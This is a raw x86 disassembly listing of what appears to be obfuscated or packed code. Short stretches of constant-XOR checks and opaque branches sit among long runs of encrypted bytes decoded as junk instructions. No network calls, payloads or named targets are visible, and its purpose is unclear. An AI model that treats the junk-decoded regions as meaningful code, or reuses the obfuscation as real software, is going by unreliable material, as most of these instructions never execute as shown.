  40190e:	push   ebp
  40190f:	inc    ebx
  401910:	addr16 xchg esi,eax
  401912:	push   ds
  401913:	leave  
  401914:	fld    QWORD PTR [eax]
  401916:	loopne 0x40193f
  401918:	les    esi,FWORD PTR [eax+ecx*4+0x6c8a5eea]
  40191f:	push   gs
  401921:	je     0x401914
  401923:	mov    bl,0x1a
  401926:	xor    esp,esp
  401928:	sub    cl,BYTE PTR [ebx-0x15]
  40192b:	mov    bl,dl
  40192d:	add    al,0xd9
  40192f:	sub    DWORD PTR [ecx+0x6],ecx
  401932:	leave  
  401933:	dec    ebx
  401934:	xchg   edi,eax
  401935:	aam    0xca
  401937:	push   cs
  401938:	cmp    ah,BYTE PTR [ebx-0x49508741]
  40193e:	retf   
  40193f:	ret    
  401940:	stos   BYTE PTR es:[edi],al
  401941:	cmp    eax,0x98c9587e
  401946:	cmp    eax,0x5ead9478
  40194b:	dec    eax
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x387bf628
  401994:	pusha  
  401995:	pop    esi
  401996:	push   ecx
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	or     eax,0x2a32385f
  4019a4:	outs   dx,BYTE PTR ds:[esi]
  4019a5:	sub    DWORD PTR [ecx-0x75],esp
  4019a8:	loop   0x401a25
  4019aa:	lds    esi,FWORD PTR [esi-0x7]
  4019ad:	jne    0x4019e4
  4019af:	jp     0x401938
  4019b1:	stos   DWORD PTR es:[edi],eax
  4019b2:	add    al,0x25
  4019b4:	stc    
  4019b5:	xlat   BYTE PTR ds:[ebx]
  4019b6:	inc    ecx
  4019b7:	push   ss
  4019b8:	push   cs
  4019b9:	sbb    ecx,DWORD PTR [ecx+0x5cd7020]
  4019bf:	cwde   
  4019c0:	sub    edi,DWORD PTR [ecx-0x370f7849]
  4019c6:	add    DWORD PTR [ecx+0x5cb5cdcd],edx
  4019cc:	mov    ds:0x2041217a,al
  4019d1:	in     eax,0xe7
  4019d3:	inc    ecx
  4019d4:	dec    edi
  4019d5:	inc    DWORD PTR ds:0x366dc96f
  4019db:	(bad)  
  4019dc:	sub    bl,BYTE PTR gs:[edi+0x383addd0]
  4019e3:	cmp    eax,0x8996161f
  4019e8:	inc    edi
  4019e9:	pop    ds
  4019ea:	jns    0x401a3a
  4019ec:	cs mov edx,0xbabdf16b
  4019f2:	xchg   ebx,eax
  4019f3:	inc    esi
  4019f4:	movs   WORD PTR es:[edi],WORD PTR fs:[esi]
  4019f7:	rcl    DWORD PTR [eax],cl
  4019f9:	cs sbb al,0x34
  4019fc:	or     BYTE PTR [esi],0x13
  4019ff:	fcmovne st,st(1)
  401a01:	add    eax,0xa3e81897
  401a06:	(bad)  
  401a07:	cmc    
  401a08:	lods   eax,DWORD PTR ds:[esi]
  401a09:	cwde   
  401a0a:	les    esi,FWORD PTR [ebx+0x34]
  401a0d:	lahf   
  401a0e:	and    esp,0x352b0a97
  401a14:	bound  eax,QWORD PTR [esp+ebp*1-0x7f52f34]
  401a1b:	xchg   ecx,eax
  401a1c:	mov    DWORD PTR ds:0x2ed390d2,edi
  401a22:	jmp    0x4019ed
  401a24:	jmp    0xf603:0xd4001f8c
  401a2b:	test   BYTE PTR [ebx],bh
  401a2d:	enter  0x2f8b,0x4f
  401a31:	jge    0x401a2f
  401a33:	enter  0x8fc2,0x5f
  401a37:	cmp    ecx,DWORD PTR [ecx+0x7a]
  401a3a:	mov    WORD PTR [edx+0x6d],?
  401a3d:	dec    ecx
  401a3e:	push   ebx
  401a3f:	sbb    ebp,DWORD PTR [edx+ebp*1]
  401a42:	call   0xbd96:0x1adde3bb
  401a49:	ins    BYTE PTR es:[edi],dx
  401a4a:	fadd   QWORD PTR [ebp-0xef765af]
  401a50:	xor    DWORD PTR [ecx+edx*4+0x3a24cea5],ebx
  401a57:	and    ebp,esp
  401a59:	xor    ebx,esp
  401a5b:	mov    esp,0x718c97f
  401a60:	loope  0x401a76
  401a62:	push   ds
  401a63:	hlt    
  401a64:	xor    DWORD PTR [eax-0x3196a20c],0xa15e5a96
  401a6e:	sbb    al,0x9c
  401a70:	dec    ecx
  401a71:	pop    esi
  401a72:	xor    DWORD PTR [edx-0x279fee51],esi
  401a78:	fild   QWORD PTR [ecx+0x6d]
  401a7b:	inc    eax
  401a7c:	addr16 cld 
  401a7e:	fbld   TBYTE PTR [ebp+esi*4-0x6818c4e4]
  401a85:	push   es
  401a86:	cmp    eax,0xba1436c
  401a8b:	sbb    DWORD PTR [esi-0x53],ecx
  401a8e:	xchg   BYTE PTR [edx+0x262bac],ah
  401a94:	xchg   esp,eax
  401a95:	adc    bh,dh
  401a97:	sbb    eax,DWORD PTR [ebx]
  401a99:	fidivr WORD PTR [eax+ecx*4-0x2e]
  401a9d:	cmp    BYTE PTR [edi+0x72],bh
  401aa0:	push   ebp
  401aa1:	(bad)  
  401aa2:	sbb    al,cl
  401aa4:	mov    ebx,0x6ece0e5e
  401aa9:	pusha  
  401aaa:	dec    esp
  401aab:	in     al,dx
  401aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aad:	push   edx
  401aae:	shl    DWORD PTR [ebx+0x5b],cl
  401ab1:	outs   dx,BYTE PTR ds:[esi]
  401ab2:	rcl    BYTE PTR [esi],1
  401ab4:	out    dx,eax
  401ab5:	lea    edx,[ecx-0x20ab5379]
  401abb:	jmp    0xf700:0xd32e52d5
  401ac2:	fdiv   QWORD PTR [edi-0x39]
  401ac5:	out    0xf1,eax
  401ac7:	pop    es
  401ac8:	pop    esi
  401ac9:	mov    WORD PTR [ecx],ds
  401acb:	jmp    0x1546:0x86c30b6c
  401ad2:	jge    0x401a8c
  401ad4:	sub    eax,0x13c952ad
  401ad9:	rol    ah,0xb2
  401adc:	mov    esi,0x32cc4336
  401ae1:	push   esi
  401ae2:	pop    esi
  401ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ae4:	add    BYTE PTR [ebx],0xc7
  401ae7:	adc    eax,0xf42486bd
  401aec:	int    0xe7
  401aee:	sbb    eax,0xf6d9fc2b
  401af3:	or     DWORD PTR [esi+0x626e1dda],0x1b
  401afa:	dec    esi
  401afb:	les    edx,FWORD PTR [edi]
  401afd:	sub    al,0xa0
  401aff:	and    dl,BYTE PTR [edx]
  401b01:	inc    ebp
  401b02:	pop    ecx
  401b03:	xchg   BYTE PTR [ebx-0x3],bl
  401b06:	or     al,ah
  401b08:	push   edi
  401b09:	inc    esp
  401b0a:	popf   
  401b0b:	xor    DWORD PTR [edi],edx
  401b0d:	mov    edi,0x3ff4fbff
  401b12:	arpl   WORD PTR [ecx-0x2ca4d002],si
  401b18:	and    al,0xac
  401b1a:	pop    ebp
  401b1b:	mov    DWORD PTR [edx+eiz*2-0x7e],ebp
  401b1f:	bound  esp,QWORD PTR [ecx]
  401b21:	mov    esi,DWORD PTR [edi+0x6d07e6f0]
  401b27:	inc    ecx
  401b28:	in     eax,dx
  401b29:	(bad)  
  401b2a:	js     0x401b7d
  401b2c:	inc    esi
  401b2d:	xlat   BYTE PTR ds:[ebx]
  401b2e:	pop    esp
  401b2f:	call   0xe9cf3331
  401b34:	call   0xd22d7fd1
  401b39:	ds fsubr st,st(7)
  401b3c:	loopne 0x401aec
  401b3e:	lock or dh,dh
  401b41:	mov    WORD PTR [edi-0x1821997],gs
  401b47:	(bad)  
  401b48:	sti    
  401b49:	mov    bl,0xc3
  401b4b:	sahf   
  401b4c:	out    0x92,eax
  401b4e:	bound  ecx,QWORD PTR [esi+0x22885d2c]
  401b54:	cmp    esi,0x9da6363b
  401b5a:	repz stc 
  401b5c:	jecxz  0x401b48
  401b5e:	aaa    
  401b5f:	dec    edi
  401b60:	lods   eax,DWORD PTR ds:[esi]
  401b61:	push   ecx
  401b62:	sbb    eax,0x91f8b29d
  401b67:	out    dx,al
  401b68:	push   ebp
  401b69:	jne    0x401b99
  401b6b:	xchg   ebp,eax
  401b6c:	sbb    edx,eax
  401b6e:	in     eax,dx
  401b6f:	gs pop ecx
  401b71:	fiadd  WORD PTR [ecx+0x69]
  401b74:	imul   ebx,DWORD PTR [ebx-0x50bf0805],0x2c
  401b7b:	inc    edi
  401b7c:	in     al,dx
  401b7d:	inc    eax
  401b7e:	mov    edx,0x678e7f87
  401b83:	imul   ebx,DWORD PTR [eax+ebp*8],0x2da00f1a
  401b8a:	fwait
  401b8b:	jle    0x401bb3
  401b8d:	inc    esi
  401b8e:	push   esi
  401b8f:	repz sbb BYTE PTR [esi+ebp*8],0x4a
  401b94:	lods   al,BYTE PTR ds:[esi]
  401b95:	push   eax
  401b96:	cmp    eax,0x12157952
  401b9b:	int3   
  401b9c:	dec    edi
  401b9d:	mov    bh,0x0
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dh,bl
  401bdd:	adc    al,0xf1
  401bdf:	sub    DWORD PTR [eax+0x78],esi
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	retf   0xd7e3
  401beb:	mov    bh,0x3
  401bed:	push   0xffffff9e
  401bef:	int3   
  401bf0:	hlt    
  401bf1:	jns    0x401c1f
  401bf3:	cmp    al,0xbe
  401bf5:	xor    eax,0xe6674c45
  401bfa:	lea    edx,[ebx+0x1d]
  401bfd:	test   BYTE PTR [ecx],al
  401bff:	rol    ebx,cl
  401c01:	mov    edi,0x3be95369
  401c06:	inc    edi
  401c07:	pop    esp
  401c08:	jmp    DWORD PTR [edx+0x351d69d8]
  401c0e:	mov    ds:0x6740ea24,eax
  401c13:	mov    esi,0x6d9197a4
  401c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c19:	rcr    BYTE PTR [edx],1
  401c1b:	call   0xc1e4:0x7f276ba4
  401c22:	js     0x401ca0
  401c24:	fbstp  TBYTE PTR [ecx-0xc]
  401c27:	xor    al,0xc1
  401c29:	pop    ds
  401c2a:	out    dx,al
  401c2b:	es jae 0x401bb1
  401c2e:	gs jg  0x401bbb
  401c31:	cmp    BYTE PTR [ecx+0x71],bl
  401c34:	add    dh,bh
  401c36:	imul   esi,ebx,0x6f
  401c39:	gs sub dh,bh
  401c3c:	and    ebx,edx
  401c3e:	add    ebx,ebp
  401c40:	mov    BYTE PTR [ecx+0x58620825],dh
  401c46:	out    0xa7,al
  401c48:	not    DWORD PTR ds:0x35de4244
  401c4e:	aaa    
  401c4f:	and    al,0x78
  401c51:	push   cs
  401c52:	mov    BYTE PTR [ebp-0x16e58341],ah
  401c58:	scas   eax,DWORD PTR es:[edi]
  401c59:	outs   dx,DWORD PTR ds:[esi]
  401c5a:	and    eax,0x4d85215c
  401c5f:	xor    al,0x9
  401c61:	jp     0x401cb7
  401c63:	fbstp  TBYTE PTR [esp+eiz*2+0x32df92ad]
  401c6a:	push   esp
  401c6b:	dec    eax
  401c6c:	mov    dl,BYTE PTR [edi-0x6e]
  401c6f:	repz mov edx,0xacfb39d2
  401c75:	jb     0x401c32
  401c77:	in     al,0xb6
  401c79:	adc    cl,BYTE PTR [ecx]
  401c7b:	retf   0x3313
  401c7e:	repnz popa 
  401c80:	fs ss push ebx
  401c83:	shl    BYTE PTR [ecx+ecx*4],1
  401c86:	sti    
  401c87:	clc    
  401c88:	test   al,0xb6
  401c8a:	sbb    edx,DWORD PTR [ebx-0x72]
  401c8d:	das    
  401c8e:	inc    esi
  401c8f:	push   ebp
  401c90:	and    eax,0x7b95b034
  401c95:	push   ds
  401c96:	pop    ss
  401c97:	nop
  401c98:	lahf   
  401c99:	test   BYTE PTR [eax],bl
  401c9b:	jmp    0x401ca0
  401c9d:	addr16 xor al,0x30
  401ca0:	mov    ds:0x6c2f5f9a,al
  401ca5:	add    al,0xe8
  401ca7:	mov    al,ds:0x4181fd9f
  401cac:	cmp    al,0xd8
  401cae:	jle    0x401cec
  401cb0:	and    ebp,ebx
  401cb2:	mov    edx,0xf9401dc0
  401cb7:	pop    es
  401cb8:	jecxz  0x401cf1
  401cba:	out    0x81,al
  401cbc:	fcomp  st(0)
  401cbe:	(bad)
  401cc1:	cmp    eax,0xd565c7e2
  401cc6:	fwait
  401cc7:	push   0xffffffa7
  401cc9:	sub    BYTE PTR [esi-0x3bf22d86],cl
  401ccf:	mov    edx,0x7d525f8a
  401cd4:	dec    esp
  401cd5:	loope  0x401d54
  401cd7:	daa    
  401cd8:	dec    esp
  401cd9:	mov    esi,0x344a1d38
  401cde:	jge    0x401d12
  401ce0:	es inc ebp
  401ce2:	push   esi
  401ce3:	popa   
  401ce4:	fs hlt 
  401ce6:	xlat   BYTE PTR ds:[ebx]
  401ce7:	imul   ebp,DWORD PTR [ecx+eax*2-0x4e],0x7b
  401cec:	mov    esi,0x6aa64660
  401cf1:	out    dx,eax
  401cf2:	loop   0x401d6a
  401cf4:	fld    TBYTE PTR [eax]
  401cf6:	xor    DWORD PTR [esi-0x79],ebx
  401cf9:	fxch   st(6)
  401cfb:	test   al,0x14
  401cfd:	imul   eax,DWORD PTR [edi+ecx*4],0x45
  401d01:	in     al,dx
  401d02:	push   es
  401d03:	mov    ebx,0x98eaa3c0
  401d08:	test   DWORD PTR [ebx],eax
  401d0a:	inc    ebx
  401d0c:	xor    ecx,DWORD PTR [ebx-0x4a7b5cf0]
  401d12:	add    esp,DWORD PTR [esi-0xd90e29c]
  401d18:	and    eax,0xcc68035c
  401d1d:	push   edx
  401d1e:	xchg   edx,eax
  401d1f:	sti    
  401d20:	imul   ecx,DWORD PTR [ebx+0x7419ed60],0x33f18ae9
  401d2a:	inc    ecx
  401d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d2c:	and    eax,0xf7c9fa2c
  401d31:	xor    DWORD PTR [ecx-0x1808124c],ebx
  401d37:	mov    edi,0x30a2c91d
  401d3c:	iret   
  401d3d:	jns    0x401cde
  401d3f:	scas   eax,DWORD PTR es:[edi]
  401d40:	mov    eax,DWORD PTR [ebx+0x79967a02]
  401d46:	xchg   esi,eax
  401d47:	mov    bh,0x6b
  401d49:	dec    ebp
  401d4a:	(bad)  
  401d4b:	fstp   QWORD PTR [ebx+0x48704c2e]
  401d51:	push   ds
  401d52:	(bad)  
  401d53:	rol    DWORD PTR [ebx-0x3aade96e],1
  401d59:	mov    dl,0x7a
  401d5b:	mov    ebx,0x4f53b007
  401d60:	xor    eax,0x5a576e78
  401d65:	xor    al,0x46
  401d67:	popa   
  401d68:	nop
  401d69:	aad    0xe1
  401d6b:	xchg   BYTE PTR [edx],cl
  401d6d:	out    dx,al
  401d6e:	add    al,0x3a
  401d70:	xlat   BYTE PTR ds:[ebx]
  401d71:	lock cmp al,0xb4
  401d74:	inc    ebp
  401d75:	dec    esp
  401d76:	js     0x401cf8
  401d78:	shl    BYTE PTR [ecx+0x736971b0],cl
  401d7e:	lods   eax,DWORD PTR ds:[esi]
  401d7f:	mov    ah,0xd3
  401d81:	clc    
  401d82:	push   ebx
  401d83:	mov    eax,fs:0x1783e219
  401d89:	and    dh,bh
  401d8b:	ja     0x401df4
  401d8d:	(bad)  
  401d8e:	push   esi
  401d8f:	xchg   esp,eax
  401d90:	mov    ds:0xae7567a4,eax
  401d95:	or     DWORD PTR [ebp-0x15],0xffffffea
  401d99:	jmp    0xe74c1702
  401d9e:	or     esp,DWORD PTR [edx]
  401da0:	pusha  
  401da1:	adc    BYTE PTR [eax],al
  401da3:	xor    al,0xd8
  401da5:	pushf  
  401da6:	dec    ebp
  401da7:	inc    ebp
  401da8:	inc    edx
  401da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401daa:	shr    DWORD PTR [ebx+0x3dffda59],1
  401db0:	mov    ds:0x718b6a8c,al
  401db5:	push   edx
  401db6:	mov    DWORD PTR [edx-0x5c],eax
  401db9:	call   0xc7a9:0xb72c150c
  401dc0:	aaa    
  401dc1:	xchg   ecx,eax
  401dc2:	dec    ebp
  401dc3:	clc    
  401dc4:	mov    eax,ds:0x34629317
  401dc9:	cwde   
  401dca:	mov    ds:0x95c0eb82,al
  401dcf:	and    eax,0xa3efa6af
  401dd4:	jmp    0xc42a:0x7e1becb5
  401ddb:	scas   eax,DWORD PTR es:[edi]
  401ddc:	arpl   WORD PTR [eax],si
  401dde:	xor    al,0x27
  401de0:	jbe    0x401e55
  401de2:	mov    esi,0x34eaa3ad
  401de7:	dec    esp
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ebx+eax*8+0x4a],dl
  401e44:	dec    edx
  401e45:	mov    bh,0x70
  401e47:	push   es
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	rcr    dl,0x24
  401e51:	pop    ecx
  401e52:	popf   
  401e53:	inc    ecx
  401e54:	out    dx,eax
  401e55:	clc    
  401e56:	mov    edx,0x61446850
  401e5b:	jnp    0x401df7
  401e5d:	xchg   edx,eax
  401e5e:	not    bh
  401e60:	and    bh,ah
  401e62:	inc    ecx
  401e63:	and    DWORD PTR [ebx+eiz*8],eax
  401e66:	add    esi,DWORD PTR [edx-0x31bb6448]
  401e6c:	push   ds
  401e6d:	xchg   esi,eax
  401e6e:	sub    DWORD PTR [esi+esi*1+0x71b5fe67],0x1c2f47e6
  401e79:	(bad)  
  401e7a:	leave  
  401e7b:	push   ebp
  401e7c:	or     al,0xe3
  401e7e:	into   
  401e7f:	(bad)  
  401e80:	shl    BYTE PTR [ebp-0x59dcc177],cl
  401e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e87:	or     eax,0x311a8ca0
  401e8c:	loopne 0x401e53
  401e8e:	ja     0x401e8b
  401e90:	ret    
  401e91:	cwde   
  401e92:	xchg   esi,eax
  401e93:	ss out 0x16,eax
  401e96:	stc    
  401e97:	repz xchg ebx,eax
  401e99:	sub    cl,BYTE PTR [eax]
  401e9b:	pop    ds
  401e9c:	ss sbb eax,0xd72f8e06
  401ea2:	push   ebp
  401ea3:	cld    
  401ea4:	daa    
  401ea5:	jle    0x401f1c
  401ea7:	mov    bh,0x3
  401ea9:	inc    ebx
  401eaa:	cmc    
  401eab:	sub    DWORD PTR [edx],0x431dd692
  401eb1:	cwde   
  401eb2:	pop    ecx
  401eb3:	ds call 0x85690637
  401eb9:	jne    0x401eb6
  401ebb:	mov    WORD PTR [eax+0x32],ds
  401ebe:	sub    esi,DWORD PTR [edx+0x6]
  401ec1:	mov    cl,0xd6
  401ec3:	or     eax,0x44abbe91
  401ec8:	add    bh,BYTE PTR [edx+0x1651fba3]
  401ece:	sbb    ah,dl
  401ed0:	lahf   
  401ed1:	scas   eax,DWORD PTR es:[edi]
  401ed2:	jge    0x401e9c
  401ed4:	jl     0x401ec7
  401ed6:	enter  0x9ece,0x0
  401eda:	jae    0x401f43
  401edc:	(bad)  
  401edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ede:	mov    ds:0xeab39065,eax
  401ee3:	adc    BYTE PTR [ebx-0x54],ch
  401ee6:	mov    cl,0x62
  401ee8:	in     al,0xa5
  401eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eeb:	out    0x1,eax
  401eed:	imul   esp,DWORD PTR [edi-0x430a1980],0xffffffdb
  401ef4:	retf   
  401ef5:	xchg   edi,eax
  401ef6:	xchg   ecx,eax
  401ef7:	enter  0x49d5,0x96
  401efb:	mov    cl,0x53
  401efd:	ror    BYTE PTR [ecx-0x2c],0xf7
  401f01:	inc    edi
  401f02:	cld    
  401f03:	sbb    eax,0x57b3a69d
  401f08:	loop   0x401f7c
  401f0a:	loope  0x401ef3
  401f0c:	shr    DWORD PTR [edi],1
  401f0e:	sti    
  401f0f:	cwde   
  401f10:	int    0x8c
  401f12:	cmp    cl,BYTE PTR [ebx]
  401f14:	ins    BYTE PTR es:[edi],dx
  401f15:	jmp    0x578bab86
  401f1a:	test   al,0xaa
  401f1c:	icebp  
  401f1d:	jmp    0x90211e8
  401f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f23:	cmp    edi,DWORD PTR [ecx-0x1]
  401f26:	jmp    0x401eed
  401f28:	add    al,0x4a
  401f2a:	clc    
  401f2b:	xchg   ebp,eax
  401f2c:	sbb    DWORD PTR [ebx],0xffffffae
  401f2f:	imul   ebp,DWORD PTR ds:0xf18c0df2,0xf
  401f36:	(bad)
  401f3a:	push   ds
  401f3b:	push   0xffffffa3
  401f3d:	repz push ebp
  401f3f:	sub    ebp,DWORD PTR [edx-0x40a4ac1d]
  401f45:	pop    ss
  401f46:	fldcw  WORD PTR [ebp-0xd]
  401f49:	lock fimul DWORD PTR [ebx+0x30]
  401f4d:	leave  
  401f4e:	and    BYTE PTR [ebp+0x78],ah
  401f51:	lods   al,BYTE PTR ds:[esi]
  401f52:	cli    
  401f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f54:	fldenv [ebx]
  401f56:	retf   
  401f57:	jno    0x401f44
  401f59:	and    esp,DWORD PTR [eax+esi*1]
  401f5c:	jb     0x401fd0
  401f5e:	xchg   ebx,eax
  401f5f:	fst    st(4)
  401f61:	cmp    BYTE PTR [esp+esi*8+0x1dddcbc1],dh
  401f68:	mov    DWORD PTR [edi+0x1c32c31c],edi
  401f6e:	in     al,dx
  401f6f:	shl    DWORD PTR [ebx],1
  401f71:	inc    ecx
  401f72:	mov    ebx,DWORD PTR [edi-0x43]
  401f75:	fcomp  QWORD PTR [edi+0x57d4cc2c]
  401f7b:	retf   
  401f7c:	cmp    al,BYTE PTR [edx-0x51]
  401f7f:	not    DWORD PTR [edx+0x64]
  401f82:	pop    ds
  401f83:	add    edi,esi
  401f85:	inc    esi
  401f86:	dec    edi
  401f87:	out    0x57,al
  401f89:	pop    edi
  401f8a:	inc    edi
  401f8b:	inc    eax
  401f8c:	in     eax,0x9e
  401f8e:	mov    BYTE PTR [esi-0x22035533],dl
  401f94:	dec    ebp
  401f95:	adc    BYTE PTR [ecx-0x68],cl
  401f98:	out    0x99,al
  401f9a:	lods   eax,DWORD PTR ds:[esi]
  401f9b:	cs ret 0xf1bc
  401f9f:	in     al,dx
  401fa0:	or     ch,bl
  401fa2:	pop    ss
  401fa3:	and    bl,bl
  401fa5:	stos   BYTE PTR es:[edi],al
  401fa6:	mov    al,0xe3
  401fa8:	push   edx
  401fa9:	xor    edx,ebp
  401fab:	push   ebx
  401fac:	sbb    DWORD PTR [ebp-0x53],ebp
  401faf:	das    
  401fb0:	int    0x54
  401fb2:	sar    DWORD PTR [ebp-0xcdd5ac7],1
  401fb8:	inc    ecx
  401fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fba:	xlat   BYTE PTR ds:[ebx]
  401fbb:	mov    bl,0xf1
  401fbd:	or     DWORD PTR [ebx+ebp*1+0x13],esi
  401fc1:	loopne 0x401fc5
  401fc3:	cli    
  401fc4:	and    eax,0x96cefef0
  401fc9:	into   
  401fca:	stc    
  401fcb:	stos   BYTE PTR es:[edi],al
  401fcc:	xchg   esi,eax
  401fcd:	sti    
  401fce:	mov    dl,0xc6
  401fd0:	pop    ss
  401fd1:	fsubr  DWORD PTR [eax]
  401fd3:	mov    eax,0x85a368a5
  401fd8:	mov    ch,0xc9
  401fda:	xchg   DWORD PTR [ebx+0x6d],ebp
  401fdd:	ins    BYTE PTR es:[edi],dx
  401fde:	pusha  
  401fdf:	cmp    al,0x76
  401fe1:	lds    ecx,FWORD PTR [ecx]
  401fe3:	push   ds
  401fe4:	in     al,0xa6
  401fe6:	pop    ebx
  401fe7:	cmovle ecx,DWORD PTR [edi]
  401fea:	push   esi
  401feb:	inc    esi
  401fec:	fucom  st(1)
  401fee:	sub    dl,BYTE PTR ds:0x23e5b3fb
  401ff4:	xor    bh,BYTE PTR [edx+0x61963431]
  401ffa:	arpl   WORD PTR [ebp-0x1],ax
  401ffd:	add    edi,edi
  401fff:	rol    ebp,cl
  402001:	xchg   dh,al
  402003:	add    eax,0x4eac42e2
  402008:	sbb    cl,ah
  40200a:	stc    
  40200b:	and    eax,0x21241e7a
  402010:	and    BYTE PTR [edi-0x71a36379],cl
  402016:	stos   BYTE PTR es:[edi],al
  402017:	mov    bl,BYTE PTR [ebx+0x53dc3686]
  40201d:	ffree  st(0)
  40201f:	sbb    dl,BYTE PTR [edi+0x5]
  402022:	fnstcw WORD PTR [ebx+0x561d4ade]
  402028:	fadd   st(1),st
  40202a:	add    eax,0x3d3f09de
  40202f:	xlat   BYTE PTR ds:[ebx]
  402030:	jb     0x402003
  402032:	xchg   ebp,eax
  402033:	ds mov dl,0x54
  402036:	xchg   edx,eax
  402037:	mov    al,ds:0xbe9a3bd6
  40203c:	sub    ebp,DWORD PTR [eax]
  40203e:	dec    eax
  40203f:	mov    BYTE PTR [edx],cl
  402041:	dec    ecx
  402042:	hlt    
  402043:	mov    ds:0x5fde5da6,al
  402048:	fs dec eax
  40204a:	fcmovb st,st(5)
  40204c:	pop    es
  40204d:	xor    BYTE PTR [ebx+0x128bd855],cl
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    BYTE PTR [ebx+0x77],0x2a
  40206d:	dec    esi
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	jae    0x402054
  402078:	jae    0x4020a7
  40207a:	add    al,0x71
  40207c:	mov    eax,ds:0xdaa0e1a3
  402081:	dec    edi
  402082:	dec    esp
  402083:	mov    ah,0x48
  402085:	bound  ebx,QWORD PTR [eax+0x96183a6]
  40208b:	mov    esp,0x6796d929
  402090:	fisubr DWORD PTR [edx+0x7b]
  402093:	fisttp DWORD PTR [esp+esi*2]
  402096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402097:	sbb    ebp,edi
  402099:	pop    ebp
  40209a:	stos   DWORD PTR es:[edi],eax
  40209b:	adc    BYTE PTR [edi],al
  40209d:	(bad)  
  40209e:	adc    al,0x6
  4020a0:	daa    
  4020a1:	xor    ecx,DWORD PTR [edx]
  4020a3:	imul   ecx,DWORD PTR [eax-0x6],0x1b
  4020a7:	loope  0x4020dc
  4020a9:	cdq    
  4020aa:	mov    eax,0xfa416901
  4020af:	pop    ds
  4020b0:	call   0x63a07f6c
  4020b5:	std    
  4020b6:	pusha  
  4020b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b8:	cli    
  4020b9:	and    bl,BYTE PTR [ebx+eax*2-0x5a7601ee]
  4020c0:	push   esi
  4020c1:	call   0x76ad:0xb1417fb3
  4020c8:	add    ebx,DWORD PTR [ebx]
  4020ca:	push   edx
  4020cb:	data16 outs dx,BYTE PTR ds:[esi]
  4020cd:	sbb    al,0xa7
  4020cf:	es repz add al,0x19
  4020d3:	iret   
  4020d4:	rcl    DWORD PTR [ebx+0x56d7b34c],1
  4020da:	jb     0x40211b
  4020dc:	cli    
  4020dd:	imul   esi,DWORD PTR [ecx+0x4fd48dca],0xe478c035
